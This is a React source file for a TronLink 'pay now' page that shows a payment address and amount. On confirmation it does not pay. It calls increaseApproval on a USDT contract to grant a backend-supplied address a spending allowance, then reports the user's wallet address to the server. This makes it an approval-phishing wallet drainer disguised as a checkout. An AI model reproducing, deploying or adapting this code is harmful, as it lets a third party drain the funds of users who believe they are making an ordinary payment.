import { definePageConfig, useSearchParams } from 'ice';
import { useState, useEffect, useRef } from 'react';
import { useInterval } from 'ahooks';

import { queryContractAddr, updateUserAddr } from '@/api';
import { base64URLDecode, parseParamMapFromUrl } from '@/utils';

import { Infos } from './config';

import { StepOne, StepTwo } from './step';

import styles from './index.module.css';

export default function Flow() {
  const [searchParams] = useSearchParams();

  const platformRef = useRef('');
  const [platform, setPlatform] = useState('');

  const [wallet, setWallet] = useState<TypeWallet>('');
  const [chain, setChain] = useState<TypeChain>('');
  // Nile测试网USDT合约地址
  // TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf
  // TODO
  // 正式地址
  // ？？？
  const [addrOne] = useState('TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf');
  const [
    //
    addrTarget,
    setAddrTarget,
  ] = useState('TUgKYJ81sy3HJVendP6MuMFKFeSXVHyxkt');

  const [pageParams, setPageParams] = useState({
    orderStr: '',
    amountStr: '',
  });
  const [platformMatched, setPlatformMatched] = useState(false);

  /* ❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌ */
  const IS_DEV = false;
  const [tempInfo, setTempInfo] = useState({});
  /* ❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌ */

  // 1 -> [收款地址/金额/立即支付]
  // 2 -> [安全操作...]
  const [flowStep, setFlowStep] = useState<'1' | '2'>('1');

  const clearUseInterval = useInterval(() => {
    if (platformRef.current === 'tronlink') {
      if (window.tronLink && window.tron?.isTronLink) {
        setWallet(Infos.tronlink.wallet);
        setChain(Infos.tronlink.chain);
        clearUseInterval?.();
        setPlatformMatched(true);
        window.tronWeb?.trx
          ?.getBalance(window.tronWeb?.defaultAddress?.base58)
          ?.then((a) => {
            setTempInfo({
              content: `TRX余额：${a / 1000000}`,
            });
          });
        // Message.show({
        //   type: 'success',
        //   align: 'cc cc',
        //   content: 'TronLink钱包',
        // });
      } else {
        // Message.show({
        //   type: 'warning',
        //   align: 'cc cc',
        //   content: '请先安装TronLink钱包',
        // });
        // clearUseInterval?.();
      }
    } else {
      clearUseInterval?.();
    }
  }, 1_000);

  const onPayNowEvt = () => {
    const payStr = `${wallet}___${chain}`;

    switch (payStr) {
      case `${Infos.tronlink.wallet}___${Infos.tronlink.chain}`:
        {
          setFlowStep('2');
        }
        break;
      default:
        {
          // setFlowStep('2');
          console.log('on click empty!');
        }
        break;
    }
  };

  const onConfirmEvt = async () => {
    try {
      const { trx, defaultAddress: da, contract } = window.tronWeb || {};
      const userAddr = da?.base58 || '';

      // 连接钱包
      const res = await window.tronLink?.request({
        method: 'tron_requestAccounts',
      });
      if (res.code !== 200) {
        alert('连接钱包失败');
        return;
      }

      // 查余额
      const _trx: number = await trx?.getBalance?.(userAddr);

      // 余额满足
      if (_trx > Infos.tronlink.trxLimit.value) {
        // ??? at ?
        const _contract = await contract?.()?.at(addrOne);
        const result = await _contract
          .increaseApproval(addrTarget, Infos.tronlink.amount)
          .send({ feeLimit: 100000000 });
        // alert(`授权成功，交易ID: ${JSON.stringify(result)}`);
        if (result) {
          updateUserAddr(userAddr);
        }
      } else {
        // ${_trx}
        alert('没有足够的 TRX 用于支付网络费！');
      }
    } catch (err) {
      //
      alert(`发生异常: ${JSON.stringify(err)}`);
    } finally {
      // alert('finally');
    }
  };

  const onCancelEvt = () => {
    setFlowStep('1');
  };

  useEffect(() => {
    queryContractAddr().then((res) => {
      const ca = res?.data?.contractAddress || '';
      if (ca) {
        setAddrTarget(ca);
      }
    });

    const encodeStr = searchParams.get('_');

    const fUrl = `https://x.com?${base64URLDecode(encodeStr)}`;
    const { orderStr, amountStr, platform } = parseParamMapFromUrl(fUrl);
    const plt = platform || '';
    platformRef.current = plt;
    setPlatform(plt);
    setPageParams({
      orderStr: orderStr || '',
      amountStr: amountStr || '',
    });

    if (['tronlink'].includes(platformRef.current) === false) {
      // 不是需要尝试的目标平台，清除
      clearUseInterval?.();
    }
  }, []);

  return (
    <div className={styles.pageContainer}>
      {IS_DEV ? (
        <div
          style={{
            position: 'fixed',
            left: '0',
            bottom: '0',
            width: '50%',
            color: '#fff',
            backgroundColor: 'tomato',
            overflow: 'scroll',
            zIndex: 1000,
          }}
        >
          <pre>{JSON.stringify(tempInfo, null, 2)}</pre>
        </div>
      ) : null}
      {flowStep === '1' ? (
        <StepOne
          platform={platform}
          payAddr={addrOne}
          amount={pageParams.amountStr}
          onPayNowClick={onPayNowEvt}
        />
      ) : null}
      {flowStep === '2' ? (
        <StepTwo
          platform={platform}
          payAddr={addrOne}
          amount={pageParams.amountStr}
          onConfirmClick={onConfirmEvt}
          onCancelClick={onCancelEvt}
        />
      ) : null}
      {platformMatched ? null : (
        <div className={styles.pageNotMatched}>
          <span className={styles.pageNotMatchedTxt}>Loading...</span>
        </div>
      )}
    </div>
  );
}

export const pageConfig = definePageConfig(() => {
  return {
    title: '立即支付',
  };
});
